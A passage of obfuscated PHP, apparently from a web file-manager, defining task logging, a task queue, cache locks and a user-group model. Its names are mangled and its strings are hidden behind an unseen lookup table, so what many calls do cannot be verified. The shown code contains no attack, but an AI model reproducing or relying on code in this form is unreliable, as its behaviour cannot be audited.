$«Äù¥¤->file(); } } Backup::set(array($ËßÒÄé[775] => 1, $ËßÒÄé[786] => time())); return !0; } public function process() { $§“›ó¸Œ =& $_SERVER[™»È’øè]; $¤ÓÛ™Ø = array($§“›ó¸Œ[782] => Task::get($§“›ó¸Œ[804]), $§“›ó¸Œ[787] => Task::get($§“›ó¸Œ[825]), $§“›ó¸Œ[213] => Task::get($§“›ó¸Œ[834])); $îÑÁğÈë = !1; foreach ($¤ÓÛ™Ø as &$óÍä¾Ò½) { if ($îÑÁğÈë) { $óÍä¾Ò½ = !1; continue; } if ($óÍä¾Ò½) { $¬óïÔ÷é = intval(_get($óÍä¾Ò½, $§“›ó¸Œ[1683], 0)); if (time() - $¬óïÔ÷é > 7200) { Task::kill($óÍä¾Ò½[$§“›ó¸Œ[442]]); $îÑÁğÈë = !0; $óÍä¾Ò½ = !1; } } } return $¤ÓÛ™Ø; } public function restore() { $ËÙÅÜµò =& $_SERVER[™»È’øè]; ActionCall($ËÙÅÜµò[1090], !0, 1); ActionCall($ËÙÅÜµò[1090], !0, 0); } } goto E°İ·°¦Ùí; dÌ˜©±õ“Ç: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ëò£í®¿, $¢ŒŸú“– = '', $ÆÔ÷‰Ì = 0, $äÛ¶¯—´ = '') { $ı‰×õ¦‡ =& $_SERVER[™»È’øè]; $å¹­´ = new Task($Ëò£í®¿, $¢ŒŸú“–, $ÆÔ÷‰Ì, $äÛ¶¯—´); $GLOBALS[$ı‰×õ¦‡[1761] . $Ëò£í®¿] = new TaskLog($ı‰×õ¦‡[1662], $å¹­´, $äÛ¶¯—´); return $å¹­´; } public function __construct($¤›İİ = '', $¥½¢âá½ = '', $Å­¯²Ò  = '') { $ÃÓ¢å¡ =& $_SERVER[™»È’øè]; if (!$¤›İİ) { $¤›İİ = $ÃÓ¢å¡[1662]; } $ûëØŒ¿Ò = $¤›İİ . $ÃÓ¢å¡[429] . rand_string(10); if (!$Å­¯²Ò ) { $Å­¯²Ò  = $¤›İİ . $ÃÓ¢å¡[53] . $Å­¯²Ò ; } switch ($¤›İİ) { case $ÃÓ¢å¡[1662]: if (!$¥½¢âá½ || !$¥½¢âá½->task) { return echoLog($¤›İİ . $ÃÓ¢å¡[1762]); } $´Õë“— = $¥½¢âá½; $ûëØŒ¿Ò = $´Õë“—->task[$ÃÓ¢å¡[442]]; $¤›İİ = $´Õë“—->task[$ÃÓ¢å¡[442]]; if (!$´Õë“—->task[$ÃÓ¢å¡[1573]]) { $´Õë“—->task[$ÃÓ¢å¡[1573]] = $Å­¯²Ò  ? $Å­¯²Ò  : $¤›İİ; } break; case $ÃÓ¢å¡[1763]: if (!$¥½¢âá½) { return echoLog($¤›İİ . $ÃÓ¢å¡[1764]); } $Œ­í¶Á– = is_string($¥½¢âá½) ? array($¥½¢âá½) : $¥½¢âá½; $´Õë“— = new TaskFileTransfer($ûëØŒ¿Ò, $¤›İİ, 0, $Å­¯²Ò  ? $Å­¯²Ò  : $Œ­í¶Á–[0]); foreach ($Œ­í¶Á– as $ÓŠè÷Ñ³) { $´Õë“—->addPath($ÓŠè÷Ñ³); } break; case $ÃÓ¢å¡[356]: if (!$¥½¢âá½) { return echoLog($¤›İİ . $ÃÓ¢å¡[1764]); } $Œ­í¶Á– = is_string($¥½¢âá½) ? array($¥½¢âá½) : $¥½¢âá½; $´Õë“— = new TaskZip($ûëØŒ¿Ò, $¤›İİ, 0, $Å­¯²Ò  ? $Å­¯²Ò  : $Œ­í¶Á–[0]); foreach ($Œ­í¶Á– as $ÓŠè÷Ñ³) { $´Õë“—->addPath($ÓŠè÷Ñ³); } break; case $ÃÓ¢å¡[1244]: if (!$¥½¢âá½) { return echoLog($¤›İİ . $ÃÓ¢å¡[1764]); } $´Õë“— = new TaskUnZip($ûëØŒ¿Ò, $¤›İİ, 0, $Å­¯²Ò  ? $Å­¯²Ò  : $¥½¢âá½); if ($¥½¢âá½) { $´Õë“—->addFile($¥½¢âá½); } break; case $ÃÓ¢å¡[148]: $´Õë“— = new TaskHttp($ûëØŒ¿Ò, $¤›İİ); break; default: return; break; } $this->task = $´Õë“—; $this->taskID = $ûëØŒ¿Ò; Hook::bind($ÃÓ¢å¡[1699], array($this, $ÃÓ¢å¡[1765])); Hook::bind($ÃÓ¢å¡[1701], array($this, $ÃÓ¢å¡[1766])); Hook::bind($ÃÓ¢å¡[1695], array($this, $ÃÓ¢å¡[1767])); echoLog($ÃÓ¢å¡[1768] . $´Õë“—->task[$ÃÓ¢å¡[1573]]); } public function __destruct() { $this->end(); } public function end($îë‡£ìÛ = '') { $¯°üê =& $_SERVER[™»È’øè]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($îë‡£ìÛ); $this->task = !1; $this->taskID = !1; Hook::unbind($¯°üê[1699], array($this, $¯°üê[1765])); Hook::unbind($¯°üê[1701], array($this, $¯°üê[1766])); Hook::unbind($¯°üê[1695], array($this, $¯°üê[1767])); } public function taskUpdate($ÙºíŠ§Ë) { $·ô°‡™€ =& $_SERVER[™»È’øè]; if (!$ÙºíŠ§Ë || $this->taskID != $ÙºíŠ§Ë[$·ô°‡™€[442]]) { return; } $ÅÈãµ­” = 20; $¶½òã¹Ù = intval($ÙºíŠ§Ë[$·ô°‡™€[1680]] * $ÅÈãµ­”); $®ç‹ô = $·ô°‡™€[162] . str_repeat($·ô°‡™€[914], $¶½òã¹Ù) . $·ô°‡™€[1044] . str_repeat($·ô°‡™€[53], $ÅÈãµ­” - $¶½òã¹Ù) . $·ô°‡™€[164]; $¯Òæ¬Ö = $®ç‹ô . sprintf($·ô°‡™€[1769], $ÙºíŠ§Ë[$·ô°‡™€[1680]] * 100) . $·ô°‡™€[1770]; $ËôÉØ = $¯Òæ¬Ö . $ÙºíŠ§Ë[$·ô°‡™€[1679]] . $·ô°‡™€[8] . $ÙºíŠ§Ë[$·ô°‡™€[811]] . LNG($·ô°‡™€[1771]); $¿òÎíæğ = $·ô°‡™€[12]; if ($ÙºíŠ§Ë[$·ô°‡™€[1755]]) { $ËôÉØ = $¯Òæ¬Ö . size_format($ÙºíŠ§Ë[$·ô°‡™€[1679]]) . $·ô°‡™€[8] . size_format($ÙºíŠ§Ë[$·ô°‡™€[811]]); $¿òÎíæğ = size_format($ÙºíŠ§Ë[$·ô°‡™€[1681]]) . $·ô°‡™€[1772]; } if ($ÙºíŠ§Ë[$·ô°‡™€[1094]]) { $ÙºíŠ§Ë[$·ô°‡™€[1729]] = $ÙºíŠ§Ë[$·ô°‡™€[1094]] . $·ô°‡™€[53] . $ÙºíŠ§Ë[$·ô°‡™€[1729]]; } if ($ÙºíŠ§Ë[$·ô°‡™€[1729]]) { $òÀ’¼Ñ„ = $·ô°‡™€[12]; if ($ÙºíŠ§Ë[$·ô°‡™€[1731]]) { $òÀ’¼Ñ„ = $·ô°‡™€[50] . size_format($ÙºíŠ§Ë[$·ô°‡™€[1732]]) . $·ô°‡™€[8] . size_format($ÙºíŠ§Ë[$·ô°‡™€[1731]]); } $¿òÎíæğ .= $ÙºíŠ§Ë[$·ô°‡™€[1729]] . $òÀ’¼Ñ„; } if ($ÙºíŠ§Ë[$·ô°‡™€[788]] && !$ÙºíŠ§Ë[$·ô°‡™€[1731]]) { $¿òÎíæğ .= $·ô°‡™€[53] . size_format($ÙºíŠ§Ë[$·ô°‡™€[1736]]) . $·ô°‡™€[8] . size_format($ÙºíŠ§Ë[$·ô°‡™€[788]]); } echoLog($ËôÉØ . $·ô°‡™€[53] . $¿òÎíæğ, !0); } public function taskEnd($ãÔ’ˆ©Ô) { $Êéı¼ø® =& $_SERVER[™»È’øè]; if (!$ãÔ’ˆ©Ô || $this->taskID != $ãÔ’ˆ©Ô[$Êéı¼ø®[442]]) { return; } $ˆ¿±˜¡à = $ãÔ’ˆ©Ô ? $ãÔ’ˆ©Ô[$Êéı¼ø®[1679]] . $Êéı¼ø®[8] . $ãÔ’ˆ©Ô[$Êéı¼ø®[811]] . LNG($Êéı¼ø®[1771]) . $Êéı¼ø®[71] : $Êéı¼ø®[12]; echoLog($Êéı¼ø®[1773] . $ãÔ’ˆ©Ô[$Êéı¼ø®[1573]] . ($ãÔ’ˆ©Ô[$Êéı¼ø®[493]] ? $Êéı¼ø®[71] . $ãÔ’ˆ©Ô[$Êéı¼ø®[493]] : $Êéı¼ø®[12]) . $Êéı¼ø®[71] . $ˆ¿±˜¡à . $Êéı¼ø®[1774] . sprintf($Êéı¼ø®[876], timeFloat() - $ãÔ’ˆ©Ô[$Êéı¼ø®[1682]]) . $Êéı¼ø®[1694]); $this->end(); } public function taskKill($ ª¨«) { $¦³¯—Ö =& $_SERVER[™»È’øè]; if (!$ ª¨« || $this->taskID != $ ª¨«[$¦³¯—Ö[442]]) { return; } echoLog($¦³¯—Ö[1775] . $ ª¨«[$¦³¯—Ö[1573]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\x6b\121\x75\145\165\145\114\x65\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\x51\x75\145\x75\x65\104\141\164\141"; const QUEUE_TIME = "\x74\141\163\153\x51\165\145\165\145\x4c\x61\163\164\x52\165\156"; const QUEUE_THREAD = "\164\141\x73\153\x51\165\145\165\x65\124\150\x72\x65\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Ş““¨ĞÊ, $Á”èç×Š = array(), $ÏÏŠëŞÈ = '', $Ùôï·½‹ = '') { $«Êë“ë =& $_SERVER[™»È’øè]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ùôï·½‹ && array_find_by_field(self::$listData, $«Êë“ë[94], $Ùôï·½‹)) { return !0; } if ($Ùôï·½‹ && array_find_by_field(self::$listDataAdd, $«Êë“ë[94], $Ùôï·½‹)) { return !0; } self::$listDataAdd[] = array($«Êë“ë[307] => $Ş““¨ĞÊ, $«Êë“ë[1776] => $Á”èç×Š, $«Êë“ë[493] => $ÏÏŠëŞÈ, $«Êë“ë[94] => $Ùôï·½‹); return !0; } public static function addSubmit() { $ÕêÊÁæÛ =& $_SERVER[™»È’øè]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ÕêÊÁæÛ[1777] . json_encode_force(array_to_keyvalue(self::$listData, $ÕêÊÁæÛ[12], $ÕêÊÁæÛ[493])), $ÕêÊÁæÛ[184]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($‘ÑŠİğ˜, $èÓÚÇ–‹ = array(), $½½¿´œ¿ = '', $ˆ—Ù¢úê = '') { $ÍÒ©†ß½ =& $_SERVER[™»È’øè]; if (self::count() >= self::MAX_LENGTH) { return !1; } $’‘Ù¿šÙ = self::getAll(); if ($ˆ—Ù¢úê && array_find_by_field($’‘Ù¿šÙ, $ÍÒ©†ß½[94], $ˆ—Ù¢úê)) { return !0; } $’‘Ù¿šÙ[] = array($ÍÒ©†ß½[307] => $‘ÑŠİğ˜, $ÍÒ©†ß½[1776] => $èÓÚÇ–‹, $ÍÒ©†ß½[493] => $½½¿´œ¿, $ÍÒ©†ß½[94] => $ˆ—Ù¢úê); self::setAll($’‘Ù¿šÙ); write_log($ÍÒ©†ß½[1777] . $½½¿´œ¿, $ÍÒ©†ß½[184]); return !0; } public static function run() { $ğÁÚ¶ =& $_SERVER[™»È’øè]; $÷Ò˜÷ö© = self::getAll(); $´ÄøÒú = array_shift($÷Ò˜÷ö©); if (!$´ÄøÒú) { return !1; } self::setAll($÷Ò˜÷ö©); $’¿–›¸ = timeFloat(); $ƒÇÔ¤ÏŠ = $ğÁÚ¶[12]; try { $ƒÇÔ¤ÏŠ = Hook::apply($´ÄøÒú[$ğÁÚ¶[307]], $´ÄøÒú[$ğÁÚ¶[1776]]); } catch (Exception $¾Æ¿ó) { write_log($¾Æ¿ó, $ğÁÚ¶[1212]); } $ÛÒë¢¤© = number_format(timeFloat() - $’¿–›¸, 3) . $ğÁÚ¶[1694]; if ($ƒÇÔ¤ÏŠ && is_string($ƒÇÔ¤ÏŠ)) { $ÛÒë¢¤© = $ÛÒë¢¤© . $ğÁÚ¶[1778] . $ƒÇÔ¤ÏŠ; } write_log($ğÁÚ¶[1779] . $´ÄøÒú[$ğÁÚ¶[493]] . $ğÁÚ¶[1780] . $ÛÒë¢¤©, $ğÁÚ¶[184]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $½ãè‚Š£ =& $_SERVER[™»È’øè]; $û¡‘„°© = self::threadCount() + 1; if ($û¡‘„°© > 3 || !self::count()) { return; } write_log($½ãè‚Š£[1781] . $û¡‘„°©, $½ãè‚Š£[184]); Cache::set(self::QUEUE_THREAD, $û¡‘„°©, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($½ãè‚Š£[1782], $½ãè‚Š£[184]); } public static function getKey($è”…ªıĞ, $£•à‡Š™ = "\151\156\x74") { $ÕùÃ¯©¯ =& $_SERVER[™»È’øè]; Cache::removeMemory($è”…ªıĞ); $•÷Æé–· = Cache::get($è”…ªıĞ); if ($£•à‡Š™ == $ÕùÃ¯©¯[331]) { return $•÷Æé–· ? intval($•÷Æé–·) : 0; } if ($£•à‡Š™ == $ÕùÃ¯©¯[1783]) { return is_array($•÷Æé–·) ? $•÷Æé–· : array(); } return $•÷Æé–·; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[™»È’øè][1783]); } public static function setAll($ßç¾É×) { $ã¡Ëö¸ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ßç¾É×), $ã¡Ëö¸); Cache::set(self::QUEUE_DATA, $ßç¾É×, $ã¡Ëö¸); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($†©î’‰–, $’¦‡Ò « = 5.0) { if (!$†©î’‰–) { return; } $›Ö¿½èŠ = Cache::get($†©î’‰–); if (!$›Ö¿½èŠ || timeFloat() - floatVal($›Ö¿½èŠ) >= $’¦‡Ò «) { Cache::set($†©î’‰–, timeFloat(), $’¦‡Ò « * 10); return !0; } return !1; } public static function timeLimitCall($ ‚ø©ù÷, $®”çùè, $º«’¤Ú…, $ÄÊüçàî = 5.0) { $ÕŸÀù» =& $_SERVER[™»È’øè]; if (!$ ‚ø©ù÷ || !$®”çùè) { return; } self::$asyncAdd = !0; $¹ïì¥ÌÁ = $ÕŸÀù»[1784]; $—´ÎÛ¿Š = Cache::get($¹ïì¥ÌÁ, !0); $æìŠ›şÊ = array($ÕŸÀù»[1785] => timeFloat(), $ÕŸÀù»[1786] => timeFloat(), $ÕŸÀù»[307] => $®”çùè, $ÕŸÀù»[1776] => $º«’¤Ú…, $ÕŸÀù»[193] => $ÄÊüçàî); if (is_array($—´ÎÛ¿Š[$ ‚ø©ù÷])) { $æìŠ›şÊ[$ÕŸÀù»[1786]] = $—´ÎÛ¿Š[$ ‚ø©ù÷][$ÕŸÀù»[1786]]; } if (is_array($—´ÎÛ¿Š[$ ‚ø©ù÷])) { if (timeFloat() - $—´ÎÛ¿Š[$ ‚ø©ù÷][$ÕŸÀù»[1785]] < $æìŠ›şÊ[$ÕŸÀù»[193]] * 0.3) { return; } $æìŠ›şÊ[$ÕŸÀù»[1786]] = $—´ÎÛ¿Š[$ ‚ø©ù÷][$ÕŸÀù»[1786]]; } $—´ÎÛ¿Š[$ ‚ø©ù÷] = $æìŠ›şÊ; Cache::set($¹ïì¥ÌÁ, $—´ÎÛ¿Š, 60); Cache::removeMemory($¹ïì¥ÌÁ); write_log($ÕŸÀù»[1787] . $ ‚ø©ù÷ . $ÕŸÀù»[71] . $®”çùè, $ÕŸÀù»[184]); } public static function timeLimitCallLoop() { $ˆÌ¯ –ı =& $_SERVER[™»È’øè]; $ÊÏËòÀõ = array($ˆÌ¯ –ı[1788]); $ëÇç°±› = in_array(strtolower(ACTION), $ÊÏËòÀõ); if (!$ëÇç°±› && !self::$asyncAdd) { return; } $á«”Å“Ÿ = $ˆÌ¯ –ı[1784]; $¥ƒ£Ë¿â = Cache::get($á«”Å“Ÿ, !0); if (!$¥ƒ£Ë¿â || count($¥ƒ£Ë¿â) <= 0) { return; } $©Êõ¿­Œ = !1; $‰ê³ú¯ = timeFloat(); $¼ˆØ™ìğ = array(); foreach ($¥ƒ£Ë¿â as $¾™¦Òèü => $–Ã…Úö‹) { if ($‰ê³ú¯ - $–Ã…Úö‹[$ˆÌ¯ –ı[1786]] > $–Ã…Úö‹[$ˆÌ¯ –ı[193]]) { $©Êõ¿­Œ = !0; try { Hook::apply($–Ã…Úö‹[$ˆÌ¯ –ı[307]], $–Ã…Úö‹[$ˆÌ¯ –ı[1776]]); write_log($ˆÌ¯ –ı[1789] . $¾™¦Òèü . $ˆÌ¯ –ı[71] . $–Ã…Úö‹[$ˆÌ¯ –ı[307]] . $ˆÌ¯ –ı[1790] . ACTION, $ˆÌ¯ –ı[184]); } catch (Exception $Â‚ë€Şã) { } continue; } $¼ˆØ™ìğ[$¾™¦Òèü] = $–Ã…Úö‹; } if (!$©Êõ¿­Œ) { return; } if (!$¼ˆØ™ìğ) { return Cache::remove($á«”Å“Ÿ); } Cache::set($á«”Å“Ÿ, $¼ˆØ™ìğ, 60); Cache::removeMemory($á«”Å“Ÿ); } public static function finished($Ö»Â¿à, $‰íù¢Ì‡) { $“ˆøÆşğ =& $_SERVER[™»È’øè]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($“ˆøÆşğ[307] => $Ö»Â¿à, $“ˆøÆşğ[1776] => $‰íù¢Ì‡); } private static function finishedRun() { $ÒŞœ¾± =& $_SERVER[™»È’øè]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $á‘¦É¡) { try { Hook::apply($á‘¦É¡[$ÒŞœ¾±[307]], $á‘¦É¡[$ÒŞœ¾±[1776]]); } catch (Exception $‰à¤Í«Ş) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto e¹Í«÷¤‘¸; bÏŒ©×óåÖ: class CacheLockRedis { public function lock($ä”Ï€À, $³®ÇÜ÷» = 10) { $ıŠÅú™ƒ = Cache::init(); $€Í¶å—Æ = microtime(!0) + $³®ÇÜ÷»; while (microtime(!0) < $€Í¶å—Æ) { $Õ§éÅ†… = $ıŠÅú™ƒ->get($ä”Ï€À); if (!$Õ§éÅ†…) { $œï€úÅº = $ıŠÅú™ƒ->setLock($ä”Ï€À, $€Í¶å—Æ, $³®ÇÜ÷»); if ($œï€úÅº) { return !0; } } else { if ($Õ§éÅ†… < microtime(!0)) { $ıŠÅú™ƒ->set($ä”Ï€À, $€Í¶å—Æ, $³®ÇÜ÷» * 2); if ($ıŠÅú™ƒ->get($ä”Ï€À) === $Õ§éÅ†…) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¡ş·ÙìŒ) { return Cache::init()->get($¡ş·ÙìŒ); } public function unlock($ûìçæ) { return Cache::init()->remove($ûìçæ); } } class CacheLockMemcached { public function lock($·ï¡©×, $ˆ¹‚²ºÑ = 0) { $‰•íÚø = Cache::init(); $®áŒß«â = microtime(!0) + $ˆ¹‚²ºÑ; while (microtime(!0) < $®áŒß«â) { $œ£ÏÂÆ = $‰•íÚø->get($·ï¡©×); if (!$œ£ÏÂÆ || $œ£ÏÂÆ < microtime(!0)) { $·×àÜÆõ = $‰•íÚø->handle->add($·ï¡©×, $®áŒß«â, $ˆ¹‚²ºÑ); if ($·×àÜÆõ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($»…§ø´·) { return Cache::init()->get($»…§ø´·); } public function unlock($§ğşœ€) { return Cache::init()->remove($§ğşœ€); } } class CacheLockDatabase { public function lock($³âÕè¢›, $ò ¦È÷Ò = 0) { $èÙÓÇˆÉ = Model($_SERVER[™»È’øè][854]); $õ¨›–¦à = microtime(!0) + $ò ¦È÷Ò; while (microtime(!0) < $õ¨›–¦à) { $ŒéÚÑ–¦ = $èÙÓÇˆÉ->get($³âÕè¢›); if (!$ŒéÚÑ–¦ || $ŒéÚÑ–¦ < microtime(!0)) { $²òßöã¼ = $èÙÓÇˆÉ->set($³âÕè¢›, $õ¨›–¦à); if ($²òßöã¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¡Ù©¶»ë) { return Model($_SERVER[™»È’øè][854])->get($¡Ù©¶»ë); } public function unlock($šˆôûŒ¶) { Model($_SERVER[™»È’øè][854])->remove($šˆôûŒ¶); } } goto C¹øšõ³Ü´; AäÈĞ¶ä½¦: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\160"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\x65" => "\147\x72\157\x75\x70\x5f\x6d\145\164\141", "\155\145\164\141\106\x69\x65\154\144" => "\147\x72\x6f\165\x70\111\104"); protected function cacheFunctionAlias($¥âËßç´) { $±ÏñÔÁ =& $_SERVER[™»È’øè]; return array($±ÏñÔÁ[1948] => array($¥âËßç´[0], $±ÏñÔÁ[1949]), $±ÏñÔÁ[1950] => array($¥âËßç´[0], $±ÏñÔÁ[1951])); } protected function getInfo($¶Šè‡Œí, $ ¹ßí£Ø = false) { $äÀÎ©ı÷ = $this->getInfoSimple($¶Šè‡Œí); if (!$äÀÎ©ı÷) { return !1; } if ($ ¹ßí£Ø) { return $this->_listDataApplyItem($äÀÎ©ı÷); } return $this->cacheFunctionGet($_SERVER[™»È’øè][1952], $¶Šè‡Œí); } protected function getInfoSimple($ˆƒ³¢¢, $ÊØôØ° = false) { $Îâ§öÒØ =& $_SERVER[™»È’øè]; if ($ÊØôØ°) { $Ê¯ÓËáê = array($Îâ§öÒØ[1870] => intval($ˆƒ³¢¢)); $€¯È¦Í = $this->where($Ê¯ÓËáê)->find(); return is_array($€¯È¦Í) ? $€¯È¦Í : array(); } return $this->cacheFunctionGet($Îâ§öÒØ[1953], $ˆƒ³¢¢); } protected function groupAdd($…ôˆä·Î) { $á€Õ™«‹ =& $_SERVER[™»È’øè]; if (!$…ôˆä·Î[$á€Õ™«‹[179]] && isset($…ôˆä·Î[$á€Õ™«‹[1870]]) && $…ôˆä·Î[$á€Õ™«‹[1870]] == 1) { if ($ú¤ş¡öŸ = $this->getInfoSimple($…ôˆä·Î[$á€Õ™«‹[1870]], !0)) { return $…ôˆä·Î[$á€Õ™«‹[1870]]; } } else { $ú¤ş¡öŸ = $this->getInfoSimple($…ôˆä·Î[$á€Õ™«‹[179]]); if (!$ú¤ş¡öŸ) { return !1; } } $ĞéèÜ±† = $á€Õ™«‹[562]; if ($ú¤ş¡öŸ[$á€Õ™«‹[552]]) { $ĞéèÜ±† = $ú¤ş¡öŸ[$á€Õ™«‹[552]] . $ú¤ş¡öŸ[$á€Õ™«‹[1870]] . $á€Õ™«‹[50]; } $úµŸµù¹ = array($á€Õ™«‹[461] => $this->groupNameAuto($…ôˆä·Î[$á€Õ™«‹[179]], $…ôˆä·Î[$á€Õ™«‹[32]]), $á€Õ™«‹[444] => $…ôˆä·Î[$á€Õ™«‹[179]], $á€Õ™«‹[619] => $ĞéèÜ±†, $á€Õ™«‹[1954] => $…ôˆä·Î[$á€Õ™«‹[1857]], $á€Õ™«‹[1955] => 0, $á€Õ™«‹[1874] => 0); if (isset($…ôˆä·Î[$á€Õ™«‹[1894]])) { $úµŸµù¹[$á€Õ™«‹[1894]] = $…ôˆä·Î[$á€Õ™«‹[1894]]; } else { $Ò¢§Âø = $this->max($á€Õ™«‹[1894]); if (!$Ò¢§Âø) { $Ò¢§Âø = 0; } $úµŸµù¹[$á€Õ™«‹[1894]] = $Ò¢§Âø + 1; } if (!empty($…ôˆä·Î[$á€Õ™«‹[1870]])) { $úµŸµù¹[$á€Õ™«‹[1870]] = $…ôˆä·Î[$á€Õ™«‹[1870]]; } $Ëé™ÃÔ = $this->add($úµŸµù¹); $this->setNamePinyin($Ëé™ÃÔ, $úµŸµù¹[$á€Õ™«‹[32]]); if (isset($…ôˆä·Î[$á€Õ™«‹[1956]])) { $this->metaSet($Ëé™ÃÔ, array($á€Õ™«‹[1956] => $…ôˆä·Î[$á€Õ™«‹[1956]], $á€Õ™«‹[1957] => $…ôˆä·Î[$á€Õ™«‹[1957]])); unset($…ôˆä·Î[$á€Õ™«‹[1956]]); unset($…ôˆä·Î[$á€Õ™«‹[1957]]); } Model($á€Õ™«‹[1362])->groupRootAdd($Ëé™ÃÔ); $this->_clearCache($…ôˆä·Î[$á€Õ™«‹[179]]); return $Ëé™ÃÔ; } protected function groupEdit($æ¤Óâ½”, $ñğ÷‡š¸) { $òâüÍå¾ =& $_SERVER[™»È’øè]; $½øÉˆŸ = $this->getInfoSimple($æ¤Óâ½”); if (!$½øÉˆŸ) { return !1; } if (!empty($ñğ÷‡š¸[$òâüÍå¾[179]])) { $‹òª·İ’ = $this->getInfoSimple($ñğ÷‡š¸[$òâüÍå¾[179]]); if (!$‹òª·İ’) { return !1; } if ($½øÉˆŸ[$òâüÍå¾[1870]] == $‹òª·İ’[$òâüÍå¾[1870]]) { return !1; } if ($ñğ÷‡š¸[$òâüÍå¾[179]] != $½øÉˆŸ[$òâüÍå¾[179]]) { if ($‹òª·İ’[$òâüÍå¾[552]] !== $½øÉˆŸ[$òâüÍå¾[552]] && strpos($‹òª·İ’[$òâüÍå¾[552]], $½øÉˆŸ[$òâüÍå¾[552]] . $½øÉˆŸ[$òâüÍå¾[1870]] . $òâüÍå¾[50]) === 0) { return !1; } $ñğ÷‡š¸[$òâüÍå¾[619]] = $‹òª·İ’[$òâüÍå¾[552]] . $ñğ÷‡š¸[$òâüÍå¾[179]] . $òâüÍå¾[50]; $this->_changeChildLevel($½øÉˆŸ, $‹òª·İ’); $this->_clearCache($‹òª·İ’[$òâüÍå¾[1870]]); $this->_clearCache($½øÉˆŸ[$òâüÍå¾[179]]); } } if (isset($ñğ÷‡š¸[$òâüÍå¾[32]])) { $this->setNamePinyin($æ¤Óâ½”, $ñğ÷‡š¸[$òâüÍå¾[32]]); } if (isset($ñğ÷‡š¸[$òâüÍå¾[1956]])) { $this->metaSet($æ¤Óâ½”, array($òâüÍå¾[1956] => $ñğ÷‡š¸[$òâüÍå¾[1956]], $òâüÍå¾[1957] => $ñğ÷‡š¸[$òâüÍå¾[1957]])); unset($ñğ÷‡š¸[$òâüÍå¾[1956]]); unset($ñğ÷‡š¸[$òâüÍå¾[1957]]); } $this->_clearChildrenCache($½øÉˆŸ); return $this->where(array($òâüÍå¾[1958] => $æ¤Óâ½”))->save($ñğ÷‡š¸); } private function _clearChildrenCache($ÆÁ“û£¥) { $Ó‘©É² =& $_SERVER[™»È’øè]; $ñ‡íÄĞë = array($Ó‘©É²[619] => array($Ó‘©É²[579], $ÆÁ“û£¥[$Ó‘©É²[552]] . $ÆÁ“û£¥[$Ó‘©É²[1870]] . $Ó‘©É²[580])); $ïƒÈÃÚ¹ = $this->field($Ó‘©É²[1870])->where($ñ‡íÄĞë)->select(); foreach ($ïƒÈÃÚ¹ as $×Şºƒè) { $this->_clearCache($×Şºƒè[$Ó‘©É²[1870]]); } } private function _clearCache($âï³Éí) { $÷—œ‹Í =& $_SERVER[™»È’øè]; $this->cacheFunctionClear($÷—œ‹Í[1952], $âï³Éí); $this->cacheFunctionClear($÷—œ‹Í[1953], $âï³Éí); } private function _changeChildLevel($Ñ‚’à®, $ Ÿì›„Ù, $Úæ¬ÛÜÎ = false) { $™„ÓÖ¥ë =& $_SERVER[™»È’øè]; $ƒõ´–îƒ = $Ñ‚’à®[$™„ÓÖ¥ë[552]] . $Ñ‚’à®[$™„ÓÖ¥ë[1870]] . $™„ÓÖ¥ë[50]; $ü¹óœŠ™ = $ Ÿì›„Ù[$™„ÓÖ¥ë[552]] . $ Ÿì›„Ù[$™„ÓÖ¥ë[1870]] . $™„ÓÖ¥ë[50] . $Ñ‚’à®[$™„ÓÖ¥ë[1870]] . $™„ÓÖ¥ë[50]; if ($Úæ¬ÛÜÎ) { $ü¹óœŠ™ = $ Ÿì›„Ù[$™„ÓÖ¥ë[552]] . $ Ÿì›„Ù[$™„ÓÖ¥ë[1870]] . $™„ÓÖ¥ë[50]; } $±À²ªÛÎ = array($™„ÓÖ¥ë[619] => array($™„ÓÖ¥ë[579], $Ñ‚’à®[$™„ÓÖ¥ë[552]] . $Ñ‚’à®[$™„ÓÖ¥ë[1870]] . $™„ÓÖ¥ë[580])); $ôµ„ü“ä = array($™„ÓÖ¥ë[619] => array($™„ÓÖ¥ë[628], "\x72\145\x70\x6c\141\x63\145\50\160\141\162\x65\x6e\x74\x4c\x65\x76\x65\x6c\54\47{$ƒõ´–îƒ}\x27\54\47{$ü¹óœŠ™}\47\x29")); $this->_clearChildrenCache($Ñ‚’à®); $this->where($±À²ªÛÎ)->data($ôµ„ü“ä)->save(); } public function setNamePinyin($šÙçƒ¤£, $™»š°§“ = false) { $Ö„‚Éà­ =& $_SERVER[™»È’øè]; if (!$™»š°§“) { $úªçŒœ“ = $this->getInfoSimple($šÙçƒ¤£); $™»š°§“ = $úªçŒœ“[$Ö„‚Éà­[32]]; } if (!Input::check($™»š°§“, $Ö„‚Éà­[622])) { 